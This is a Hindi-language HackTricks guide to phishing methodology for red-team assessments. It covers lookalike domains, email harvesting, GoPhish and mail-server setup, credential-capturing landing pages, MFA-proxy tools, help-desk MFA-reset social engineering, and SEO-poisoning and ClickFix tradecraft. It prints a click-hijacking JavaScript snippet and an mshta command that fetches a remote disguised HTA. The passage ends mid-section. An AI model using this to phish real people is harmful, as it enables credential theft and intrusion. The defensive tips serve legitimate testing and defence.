# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Victim की reconnaissance करें
   1. **victim domain** चुनें।
   2. कुछ बुनियादी web enumeration करके **victim द्वारा इस्तेमाल किए जाने वाले login portals खोजें** और **तय करें** कि आप किसकी **नकल करेंगे**।
   3. ईमेल **खोजने** के लिए **OSINT** का इस्तेमाल करें।
2. Environment तैयार करें
   1. Phishing assessment के लिए इस्तेमाल किया जाने वाला **domain खरीदें**।
   2. ईमेल सेवा से जुड़े records (SPF, DMARC, DKIM, rDNS) **configure करें**।
   3. VPS पर **gophish** configure करें।
3. Campaign तैयार करें
   1. **ईमेल template** तैयार करें।
   2. Credentials चुराने के लिए **web page** तैयार करें।
4. Campaign लॉन्च करें!

## मिलते-जुलते domain names बनाएं या भरोसेमंद domain खरीदें

### Domain Name Variation Techniques

- **Keyword**: Domain name में मूल domain का कोई महत्वपूर्ण **keyword शामिल होता है** (उदाहरण के लिए, zelster.com-management.com)।<sup>[[1]](#references)</sup>
- **hypened subdomain**: Subdomain के **dot को hyphen से बदलें** (उदाहरण के लिए, www-zelster.com)।
- **New TLD**: नए **TLD** का इस्तेमाल करने वाला वही domain (उदाहरण के लिए, zelster.org)।
- **Homoglyph**: Domain name के किसी अक्षर को **उससे मिलता-जुलता दिखने वाला अक्षर** बनाकर **बदलता है** (उदाहरण के लिए, zelfser.com)।


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Domain name के **दो अक्षरों की जगह बदलता है** (उदाहरण के लिए, zelsetr.com)।
- **Singularization/Pluralization**: Domain name के अंत में “s” जोड़ता या हटाता है (उदाहरण के लिए, zeltsers.com)।
- **Omission**: Domain name से एक अक्षर **हटाता है** (उदाहरण के लिए, zelser.com)।
- **Repetition:** Domain name में एक अक्षर **दोहराता है** (उदाहरण के लिए, zeltsser.com)।
- **Replacement**: Homoglyph जैसा, लेकिन कम stealthy। Domain name के किसी अक्षर को बदलता है, संभवतः ऐसे अक्षर से जो keyboard पर मूल अक्षर के पास हो (उदाहरण के लिए, zektser.com)।
- **Subdomained**: Domain name के अंदर एक **dot** जोड़ता है (उदाहरण के लिए, ze.lster.com)।
- **Insertion**: Domain name में एक अक्षर **जोड़ता है** (उदाहरण के लिए, zerltser.com)।
- **Missing dot**: TLD को domain name के अंत में जोड़ता है (उदाहरण के लिए, zelstercom.com)।

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

इस बात की **संभावना होती है कि संग्रहित या संचार में मौजूद कुछ bits विभिन्न कारणों**, जैसे solar flares, cosmic rays या hardware errors, से अपने-आप flip हो जाएं।

जब इस अवधारणा को **DNS requests पर लागू किया जाता है**, तो संभव है कि **DNS server को मिला domain**, अनुरोध किए गए मूल domain से अलग हो।

उदाहरण के लिए, "windows.com" में एक bit बदलने से यह "windnws.com" बन सकता है।

Attackers **इसका फायदा उठाने के लिए victim के domain से मिलते-जुलते कई bit-flipping domains register कर सकते हैं**। उनका मकसद वैध users को अपने infrastructure पर redirect करना होता है।

अधिक जानकारी के लिए [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) पढ़ें।<sup>[[10]](#references)[[11]](#references)</sup>

### भरोसेमंद domain खरीदें

इस्तेमाल के लिए एक expired domain खोजने हेतु [https://www.expireddomains.net/](https://www.expireddomains.net) पर खोज सकते हैं।\
यह सुनिश्चित करने के लिए कि आप जो expired domain खरीदने वाले हैं, उसका **SEO पहले से अच्छा है**, आप देख सकते हैं कि उसे यहां किस श्रेणी में रखा गया है:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## ईमेल खोजना

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% मुफ़्त)
- [https://phonebook.cz/](https://phonebook.cz) (100% मुफ़्त)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

और अधिक valid email addresses **खोजने** या पहले से खोजे गए addresses को **verify करने** के लिए जांचें कि क्या आप victim के SMTP servers पर brute-force कर सकते हैं। [यहां जानें कि email address को verify/discover कैसे करें](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)।\
इसके अलावा, यह न भूलें कि अगर users अपने mail तक पहुंचने के लिए **किसी web portal का इस्तेमाल करते हैं**, तो आप जांच सकते हैं कि क्या वह **username brute force** के लिए vulnerable है, और संभव हो तो vulnerability का फायदा उठा सकते हैं।

## GoPhish configure करना

### Installation

इसे [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) से download कर सकते हैं।

इसे download करके `/opt/gophish` के अंदर decompress करें और `/opt/gophish/gophish` चलाएं।\
Output में port 3333 पर admin user के लिए password दिया जाएगा। इसलिए, उस port पर जाएं और admin password बदलने के लिए उन credentials का इस्तेमाल करें। आपको उस port को local पर tunnel करना पड़ सकता है:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### कॉन्फ़िगरेशन

**TLS certificate कॉन्फ़िगरेशन**

इस चरण से पहले, जिस domain का आप उपयोग करने वाले हैं, उसे **खरीद चुके** होने चाहिए और वह उस **VPS के IP** पर **point** होना चाहिए जहाँ आप **gophish** कॉन्फ़िगर कर रहे हैं।

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Mail configuration**

इंस्टॉल करना शुरू करें: `apt-get install postfix`

फिर निम्न फ़ाइलों में domain जोड़ें:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** के अंदर निम्न variables की values भी बदलें

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

अंत में **`/etc/hostname`** और **`/etc/mailname`** फ़ाइलों को अपने domain name से बदलें और **अपने VPS को restart करें।**

अब, `mail.<domain>` का एक **DNS A record** बनाएँ, जो VPS के **IP address** की ओर point करे, और `mail.<domain>` की ओर point करने वाला एक **DNS MX** record बनाएँ।

अब email भेजने का परीक्षण करते हैं:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish कॉन्फ़िगरेशन**

gophish को चलाना बंद करें और इसे कॉन्फ़िगर करें।\
`/opt/gophish/config.json` को निम्नानुसार संशोधित करें (https के उपयोग पर ध्यान दें):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**gophish service कॉन्फ़िगर करें**

gophish service बनाने के लिए, ताकि यह अपने-आप शुरू हो सके और service के रूप में प्रबंधित किया जा सके, आप निम्नलिखित सामग्री वाली फ़ाइल `/etc/init.d/gophish` बना सकते हैं:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

सेवा को कॉन्फ़िगर करना और उसकी जाँच करना पूरा करें:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Mail server और domain कॉन्फ़िगर करना

### इंतज़ार करें और वैध दिखें

Domain जितना पुराना होगा, spam के रूप में पकड़े जाने की संभावना उतनी ही कम होगी। इसलिए phishing assessment से पहले जितना संभव हो उतना इंतज़ार करें (कम से कम 1 सप्ताह)। इसके अलावा, अगर आप किसी प्रतिष्ठित क्षेत्र के बारे में एक page डालते हैं, तो उससे मिलने वाली reputation बेहतर होगी।

ध्यान दें कि भले ही आपको एक सप्ताह इंतज़ार करना पड़े, आप अभी सब कुछ कॉन्फ़िगर करना पूरा कर सकते हैं।

### Reverse DNS (rDNS) record कॉन्फ़िगर करें

एक rDNS (PTR) record सेट करें, जो VPS के IP address को domain name पर resolve करे।

### Sender Policy Framework (SPF) Record

आपको **नए domain के लिए SPF record कॉन्फ़िगर करना होगा**। अगर आपको नहीं पता कि SPF record क्या होता है, तो [**यह page पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#spf)।

अपनी SPF policy बनाने के लिए [https://www.spfwizard.net/](https://www.spfwizard.net) का इस्तेमाल कर सकते हैं (VPS machine का IP इस्तेमाल करें)

![phishing domain के लिए SPF record बनाने वाला SPF Wizard form](<../../images/image (1037).png>)

यह वह content है जिसे domain के अंदर TXT record में सेट करना होगा:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Domain-based Message Authentication, Reporting & Conformance (DMARC) रिकॉर्ड

आपको **नए domain के लिए DMARC रिकॉर्ड कॉन्फ़िगर करना होगा**। अगर आपको नहीं पता कि DMARC रिकॉर्ड क्या होता है, तो [**यह पेज पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

आपको `_dmarc.<domain>` hostname की ओर इंगित करने वाला एक नया DNS TXT रिकॉर्ड बनाना होगा, जिसमें निम्नलिखित content हो:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

आपको **नए domain के लिए DKIM configure करना होगा**। अगर आपको नहीं पता कि DKIM record क्या होता है, तो [**यह पेज पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)।

यह tutorial इस पर आधारित है: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> आपको DKIM key द्वारा generate की गई दोनों B64 values को concatenate करना होगा:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### अपने ईमेल कॉन्फ़िगरेशन स्कोर की जाँच करें

आप यह [https://www.mail-tester.com/](https://www.mail-tester.com) का उपयोग करके कर सकते हैं\
बस पेज खोलें और उनके दिए गए पते पर ईमेल भेजें:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

आप `check-auth@verifier.port25.com` पर ईमेल भेजकर और **जवाब पढ़कर** अपनी **ईमेल कॉन्फ़िगरेशन भी जाँच सकते हैं** (इसके लिए आपको port **25** खोलना होगा और अगर आप root के रूप में ईमेल भेजते हैं, तो जवाब `/var/mail/root` फ़ाइल में देखना होगा)।\
जाँचें कि आप सभी टेस्ट पास करते हैं:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

आप **अपने नियंत्रण वाले Gmail खाते पर संदेश** भी भेज सकते हैं, और अपने Gmail inbox में **ईमेल के headers** जाँच सकते हैं। `Authentication-Results` header field में `dkim=pass` मौजूद होना चाहिए।

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Spamhaus Blacklist से हटाना

[www.mail-tester.com](https://www.mail-tester.com) पेज बता सकता है कि आपका domain Spamhaus द्वारा ब्लॉक किया जा रहा है या नहीं। आप अपने domain/IP को हटाने का अनुरोध यहाँ कर सकते हैं: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist से हटाना

​​आप अपने domain/IP को हटाने का अनुरोध [https://sender.office.com/](https://sender.office.com) पर कर सकते हैं।

## GoPhish Campaign बनाएँ और लॉन्च करें

### Sending Profile

- sender profile की **पहचान के लिए कोई नाम** सेट करें
- तय करें कि आप किस account से phishing emails भेजेंगे। सुझाव: _noreply, support, servicedesk, salesforce..._
- आप username और password खाली छोड़ सकते हैं, लेकिन **Ignore Certificate Errors** को चुनना न भूलें

![GoPhish Campaign बनाएँ और लॉन्च करें - Sending Profile: आप username और password खाली छोड़ सकते हैं, लेकिन Ignore Certificate Errors को चुनना न भूलें](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> यह जाँचने के लिए कि सब कुछ काम कर रहा है, "**Send Test Email**" सुविधा का इस्तेमाल करने की सलाह दी जाती है।\
> मेरा सुझाव है कि परीक्षण करते समय blacklist में आने से बचने के लिए **test emails, 10min mail addresses पर भेजें**।

### Email Template

- template की **पहचान के लिए कोई नाम** सेट करें
- फिर एक **subject** लिखें (कुछ असामान्य नहीं, बस ऐसा कुछ जिसकी आप किसी नियमित email में उम्मीद कर सकते हैं)
- सुनिश्चित करें कि आपने "**Add Tracking Image**" चुना है
- **email template** लिखें (आप निम्नलिखित उदाहरण की तरह variables का इस्तेमाल कर सकते हैं):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

ध्यान दें कि **ईमेल की विश्वसनीयता बढ़ाने के लिए**, क्लाइंट के किसी ईमेल से हस्ताक्षर इस्तेमाल करने की सलाह दी जाती है। सुझाव:

- किसी **मौजूद न होने वाले पते** पर ईमेल भेजें और देखें कि जवाब में कोई हस्ताक्षर है या नहीं।
- info@ex.com या press@ex.com या public@ex.com जैसे **सार्वजनिक ईमेल** खोजें, उन्हें ईमेल भेजें और जवाब का इंतज़ार करें।
- खोजे गए **किसी मान्य ईमेल** से संपर्क करने की कोशिश करें और जवाब का इंतज़ार करें

![Sending Profile - Email Template: खोजे गए किसी मान्य ईमेल से संपर्क करने की कोशिश करें और जवाब का इंतज़ार करें](<../../images/image (80).png>)

> [!TIP]
> Email Template में **भेजने के लिए फ़ाइलें अटैच करने** की सुविधा भी है। अगर आप विशेष रूप से तैयार की गई फ़ाइलों/दस्तावेज़ों से NTLM challenges भी चुराना चाहते हैं, तो [यह पेज पढ़ें](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)।

### Landing Page

- एक **नाम** लिखें
- वेब पेज का **HTML code लिखें**। ध्यान दें कि आप वेब पेज **import** कर सकते हैं।
- **Capture Submitted Data** और **Capture Passwords** को चुनें
- एक **redirection** सेट करें

![Email Template - Landing Page: Capture Submitted Data और Capture Passwords को चुनें](<../../images/image (826).png>)

> [!TIP]
> आम तौर पर आपको पेज का HTML code संशोधित करना होगा और स्थानीय रूप से कुछ परीक्षण करने होंगे (शायद Apache server का उपयोग करके), **जब तक कि नतीजा आपकी पसंद का न हो जाए।** फिर, उस HTML code को बॉक्स में लिखें।\
> ध्यान दें कि अगर आपको HTML के लिए **कुछ static resources** इस्तेमाल करने हैं (शायद कुछ CSS और JS pages), तो आप उन्हें _**/opt/gophish/static/endpoint**_ में सहेज सकते हैं और फिर _**/static/\<filename>**_ से उन तक पहुँच सकते हैं।

> [!TIP]
> Redirection के लिए, आप **उपयोगकर्ताओं को पीड़ित की वैध मुख्य वेब पेज पर भेज सकते हैं**, या उदाहरण के लिए उन्हें _/static/migration.html_ पर भेज सकते हैं, जहाँ कुछ **spinning wheel (**[**https://loading.io/**](https://loading.io)**) 5 seconds तक दिखाएँ और फिर बताएँ कि प्रक्रिया सफल रही**।

### Users & Groups

- एक नाम सेट करें
- **डेटा import करें** (ध्यान दें कि उदाहरण के लिए template इस्तेमाल करने हेतु, आपको हर उपयोगकर्ता का first name, last name और email address चाहिए)

![Landing Page - Users & Groups: डेटा import करें (ध्यान दें कि उदाहरण के लिए template इस्तेमाल करने हेतु, आपको हर उपयोगकर्ता का first name, last name और email address चाहिए)](<../../images/image (163).png>)

### Campaign

अंत में, नाम, email template, landing page, URL, sending profile और group चुनकर एक campaign बनाएँ। ध्यान दें कि URL वह link होगा जो पीड़ितों को भेजा जाएगा।

ध्यान दें कि **Sending Profile से आप यह देखने के लिए test email भेज सकते हैं कि अंतिम phishing email कैसा दिखाई देगा**:

![Users & Groups - Campaign: ध्यान दें कि Sending Profile से आप यह देखने के लिए test email भेज सकते हैं कि अंतिम phishing email कैसा दिखाई देगा](<../../images/image (192).png>)

सब कुछ तैयार होने पर, बस campaign लॉन्च करें!

## Website Cloning

अगर किसी भी वजह से आप वेबसाइट clone करना चाहते हैं, तो यह पेज देखें:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

कुछ phishing assessments (मुख्य रूप से Red Teams के लिए) में आप **किसी तरह के backdoor वाली फ़ाइलें भी भेजना चाहेंगे** (शायद C2 या शायद ऐसा कुछ जो authentication शुरू कर दे)।\
कुछ उदाहरणों के लिए यह पेज देखें:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

पिछला attack काफ़ी चालाक है, क्योंकि इसमें आप असली वेबसाइट का रूप धरते हैं और उपयोगकर्ता द्वारा दर्ज की गई जानकारी इकट्ठा करते हैं। दुर्भाग्य से, अगर उपयोगकर्ता ने सही password दर्ज नहीं किया या आपके द्वारा नक़ल किए गए application में 2FA कॉन्फ़िगर है, तो **यह जानकारी आपको धोखे में आए उपयोगकर्ता का रूप धरने नहीं देगी**।

यहीं [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) और [**muraena**](https://github.com/muraenateam/muraena) जैसे tools काम आते हैं। यह tool आपको MitM जैसा attack करने देता है। मूल रूप से, attack इस तरह काम करता है:

1. आप असली वेबपेज के login form का **रूप धरते हैं**।
2. उपयोगकर्ता आपके नकली पेज पर अपने **credentials भेजता है** और tool उन्हें असली वेबपेज पर भेजता है, **और जाँचता है कि credentials काम करते हैं या नहीं**।
3. अगर account में **2FA** कॉन्फ़िगर है, तो MitM पेज उसके लिए पूछेगा और **उपयोगकर्ता के उसे दर्ज करते ही**, tool उसे असली वेबपेज पर भेज देगा।
4. उपयोगकर्ता के authenticated हो जाने पर, MitM करते समय उसके हर interaction से **credentials, 2FA, cookie और कोई भी जानकारी आपके (attacker के) पास capture हो जाएगी**।

### Via VNC

क्या होगा अगर **पीड़ित को असली पेज जैसी दिखने वाली किसी malicious page पर भेजने** के बजाय, आप उसे **असली वेबपेज से जुड़े browser वाले VNC session पर भेजें**? आप देख पाएँगे कि वह क्या करता है, password, इस्तेमाल किया गया MFA, cookies वगैरह चुरा पाएँगे...\
आप यह [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) से कर सकते हैं।<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

ज़ाहिर है, यह पता लगाने के सबसे अच्छे तरीकों में से एक कि आप पकड़े गए हैं या नहीं, **अपने domain को blacklists में खोजना** है। अगर वह सूची में दिखता है, तो किसी तरह आपके domain को संदिग्ध माना गया है।\
यह जाँचने का एक आसान तरीका कि आपका domain किसी blacklist में है या नहीं, [https://malwareworld.com/](https://malwareworld.com) का इस्तेमाल करना है।

हालाँकि, यह जानने के दूसरे तरीके भी हैं कि पीड़ित **खुले इंटरनेट पर संदिग्ध phishing गतिविधि को सक्रिय रूप से खोज रहा है या नहीं**, जैसा कि यहाँ बताया गया है:


{{#ref}}
detecting-phising.md
{{#endref}}

आप पीड़ित के domain से **बहुत मिलते-जुलते नाम वाला domain खरीद सकते हैं** और/या अपने नियंत्रण वाले domain के किसी **subdomain** के लिए ऐसा **certificate बना सकते हैं जिसमें** पीड़ित के domain का **keyword** हो। अगर **पीड़ित** उनके साथ किसी तरह का **DNS या HTTP interaction** करता है, तो आपको पता चल जाएगा कि **वह संदिग्ध domains को सक्रिय रूप से खोज रहा है** और आपको बहुत stealth रहना होगा।<sup>[[2]](#references)</sup>

### Evaluate the phishing

यह जाँचने के लिए [**Phishious** ](https://github.com/Rices/Phishious)का उपयोग करें कि आपका email spam folder में जाएगा, block होगा या सफल रहेगा।

## High-Touch Identity Compromise (Help-Desk MFA Reset)

आधुनिक intrusion sets, MFA को हराने के लिए, email lures को पूरी तरह छोड़कर **सीधे service-desk / identity-recovery workflow को निशाना बना रहे हैं**। यह attack पूरी तरह "living-off-the-land" है: valid credentials हासिल करने के बाद operator, built-in admin tooling का इस्तेमाल करके आगे बढ़ता है – किसी malware की ज़रूरत नहीं होती।<sup>[[6]](#references)</sup>

### Attack flow
1. पीड़ित के बारे में जानकारी जुटाएँ
   * LinkedIn, data breaches, सार्वजनिक GitHub आदि से व्यक्तिगत और कॉर्पोरेट जानकारी जुटाएँ।
   * उच्च-मूल्य वाले identities (executives, IT, finance) की पहचान करें और password / MFA reset के लिए **सटीक help-desk प्रक्रिया** का पता लगाएँ।
2. रियल-टाइम social engineering
   * लक्ष्य का रूप धरकर help-desk को phone करें, Teams पर संपर्क करें या chat करें (अक्सर **spoofed caller-ID** या **cloned voice** के साथ)।
   * ज्ञान-आधारित verification पास करने के लिए पहले से जुटाई गई PII दें।
   * Agent को **MFA secret reset करने** या पंजीकृत mobile number पर **SIM-swap** करने के लिए मनाएँ।
3. पहुँच मिलने के तुरंत बाद की कार्रवाइयाँ (वास्तविक मामलों में ≤60 min)
   * किसी भी web SSO portal के ज़रिए foothold स्थापित करें।
   * AD / AzureAD की जानकारी built-ins से जुटाएँ (कोई binaries drop किए बिना):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Environment में पहले से allowlist किए गए **WMI**, **PsExec**, या वैध **RMM** agents के ज़रिए lateral movement।

### Detection & Mitigation
* Help-desk identity recovery को **privileged operation** मानें – इसके लिए step-up auth और manager की approval अनिवार्य करें।
* ऐसे alerts के लिए **Identity Threat Detection & Response (ITDR)** / **UEBA** rules deploy करें:  
  * MFA method बदलने के बाद नए device / geo से authentication।  
  * उसी principal का तुरंत elevation (user-→-admin)।  
* Help-desk calls रिकॉर्ड करें और किसी भी reset से पहले **पहले से registered number पर call-back** अनिवार्य करें।
* **Just-In-Time (JIT) / Privileged Access** लागू करें, ताकि नए reset किए गए accounts को high-privilege tokens अपने-आप न मिलें।

---

## बड़े पैमाने पर Deception – SEO Poisoning और “ClickFix” Campaigns
Commodity crews, high-touch ops की लागत की भरपाई mass attacks से करते हैं, जिनमें **search engines और ad networks को delivery channel** बना दिया जाता है।<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** `chromium-update[.]site` जैसे नकली result को search ads में सबसे ऊपर दिखाता है।
2. Victim एक छोटा **first-stage loader** (अक्सर JS/HTA/ISO) download करता है। Unit 42 ने ये उदाहरण देखे:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader browser cookies और credential DBs को exfiltrate करता है, फिर एक **silent loader** लाता है, जो *real-time* में तय करता है कि क्या deploy करना है:
   * RAT (जैसे AsyncRAT, RustDesk)
   * ransomware / wiper
   * persistence component (registry Run key + scheduled task)

### Hardening tips
* नए registered domains को block करें और e-mail के साथ-साथ *search-ads* पर भी **Advanced DNS / URL Filtering** लागू करें।
* Software installation को signed MSI / Store packages तक सीमित करें; policy के ज़रिए `HTA`, `ISO`, `VBS` execution को deny करें।
* Browsers के child processes द्वारा installers खोलने पर नज़र रखें:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* First-stage loaders द्वारा अक्सर दुरुपयोग किए जाने वाले LOLBins खोजें (जैसे `regsvr32`, `curl`, `mshta`)।

### TDS handoff के साथ download-button click hijacking
कुछ नकली software portals दिखने वाले download `href` को **वास्तविक** GitHub/release URL पर रखते हैं, लेकिन JavaScript में उपयोगकर्ता की **पहली** interaction को hijack करके पीड़ित को इसके बजाय **Traffic Distribution System (TDS)** chain में भेज देते हैं।<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

मुख्य विशेषताएँ:
- Hook आमतौर पर `document` पर **capture phase** (`true`) में चलता है, इसलिए यह साइट के handlers से पहले fire होता है।
- Chrome अक्सर `click` के बजाय `mousedown` का उपयोग करता है, ताकि redirect एक वैध **user gesture** से जुड़ा रहे और popup-blocker bypass बेहतर हो।
- कुछ variants पहले `about:blank` खोलते हैं या `<a target="_blank">` clicks synthesize करते हैं, और TDS URL बाद में assign करते हैं।
- Browser-side caps आमतौर पर `localStorage` में रहते हैं, इसलिए **पहला click** malware तक पहुँच सकता है, जबकि refreshes/retries पर benign दिखने वाला visible link खुलता है।
- TDS referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context और per-session counters के आधार पर पहुँच सीमित कर सकता है। इससे analyst replays के परिणाम हर बार अलग हो सकते हैं।

Defender के लिए सुझाव:
- **दिखाए गए** `href` की तुलना click के समय बनाए गए **वास्तविक** navigation target से करें।
- ऐसे `document.addEventListener(..., true)` handlers खोजें, जो `window.open`, `about:blank` या synthetic anchor clicks के साथ `preventDefault()` और `stopImmediatePropagation()` दोनों call करते हैं।
- नए registered software-download domains के ऐसे समूहों को, जो सभी एक ही CloudFront/JS stage load करते हैं, SEO-poisoning/TDS pattern का high-signal संकेत मानें।

### Fake verification pages से ClickFix + archive-जैसे दिखने वाले LOLBAS fetches
कुछ TDS branches एक fake verification page पर पहुँचते हैं (Cloudflare/IUAM जैसी), जो victim को कोई trusted Windows binary चलाने के लिए कहता है:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

नोट्स:
- `mshta.exe` response की शुरुआत में मौजूद **HTA/VBScript** को execute करता है, भले ही URL `.7z` archive होने का दिखावा करे; जोड़ी गई archive data पूरी तरह decoy हो सकती है।
- आगे के stages अक्सर file type के बारे में झूठ बोलते रहते हैं (`.rtf` for PowerShell, `.asar` for Python, padded binaries वाली ZIPs), और फिर **manual PE mapping / in-memory execution** पर switch कर जाते हैं।
- अगर आप ऐसी किसी chain पर प्रतिक्रिया दे रहे हैं, तो **पहली सफल run से network + memory** सुरक्षित रखें: बाद के replays में सिर्फ benign installer/SFX path दिख सकता है या payload/key release मूल TDS session से bound होने के कारण वे fail हो सकते हैं।

### ClickFix DLL delivery tradecraft (नकली CERT update)
* Lure: cloned national CERT advisory, जिसमें **Update** button होता है और step-by-step “fix” निर्देश दिखाता है। Victims से कहा जाता है कि वे ऐसा batch चलाएँ जो DLL download करे और `rundll32` के ज़रिए उसे execute करे।<sup>[[12]](#references)</sup>
* देखा गया typical batch chain:
  ```cmd
